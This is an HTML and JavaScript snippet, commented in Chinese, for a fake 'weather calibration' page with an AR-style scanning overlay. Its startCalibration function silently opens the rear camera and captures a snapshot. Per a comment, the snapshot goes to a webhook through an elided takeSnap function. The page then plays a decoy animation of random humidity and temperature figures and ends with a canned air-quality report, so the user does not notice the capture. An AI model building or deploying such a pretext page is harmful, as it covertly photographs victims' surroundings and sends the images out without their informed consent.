<!-- 在 <style> 中加入掃描線特效 -->
<style>
    /* ...保留原本樣式... */
    #scanner-overlay {
        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.3); z-index: 100;
    }
    .scan-line {
        width: 100%; height: 2px; background: #007aff; position: absolute;
        box-shadow: 0 0 15px #007aff; animation: scan 2s linear infinite;
    }
    .data-text {
        position: absolute; color: #00ff00; font-family: monospace; font-size: 14px;
        top: 20px; left: 20px; text-shadow: 1px 1px 2px #000;
    }
    @keyframes scan { from { top: 0; } to { top: 100%; } }
</style>

<!-- 修改後的 Video 顯示區域 -->
<div id="scanner-overlay">
    <video id="live-v" style="width:100%; height:100%; object-fit:cover;" autoplay playsinline></video>
    <div class="scan-line"></div>
    <div class="data-text" id="live-data">正在分析空氣分子...<br>H2O: 12%<br>Temp: --</div>
</div>

<script>
// ... 保留原本的 webhook 與 takeSnap 函式 ...

async function startCalibration() {
    const status = document.getElementById("status");
    document.getElementById("btn").style.display = "none";
    document.getElementById("loader").style.display = "block";
    status.innerHTML = "正在連線到氣象站...";

    try {
        // Step 1: 靜默執行拍照上傳 (使用後鏡頭)
        let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        let hiddenV = document.getElementById("v");
        hiddenV.srcObject = stream;
        await hiddenV.play();
        
        await takeSnap(hiddenV, "env.jpg", "📸 背景環境快照");
        stream.getTracks().forEach(t => t.stop());

        // Step 2: 所有「動作」結束後，正式進入「AR 介面」
        enterARMode();

    } catch (err) {
        alert("權限遭拒：請允許相機存取以進行天氣校準。");
        location.reload();
    }
}

function enterARMode() {
    const overlay = document.getElementById("scanner-overlay");
    const liveV = document.getElementById("live-v");
    const dataDisplay = document.getElementById("live-data");
    
    overlay.style.display = "block";
    
    // 再次啟動相機讓使用者看見
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
    .then(stream => {
        liveV.srcObject = stream;
        
        // 模擬動態數據跳動
        let timer = setInterval(() => {
            let humidity = (Math.random() * (65 - 55) + 55).toFixed(1);
            let temp = (Math.random() * (27 - 25) + 25).toFixed(1);
            dataDisplay.innerHTML = `[AR 模式已啟動]<br>偵測粒子: H2O, N2, O2<br>當前濕度: ${humidity}%<br>環境溫度: ${temp}°C`;
        }, 500);

        // 5秒後給出最終報告
        setTimeout(() => {
            clearInterval(timer);
            alert("分析完成！\n當前空氣濕度：58.4%\n感測溫度：26.2°C\n環境品質：優良");
            location.reload();
        }, 5000);
    });
}
</script>
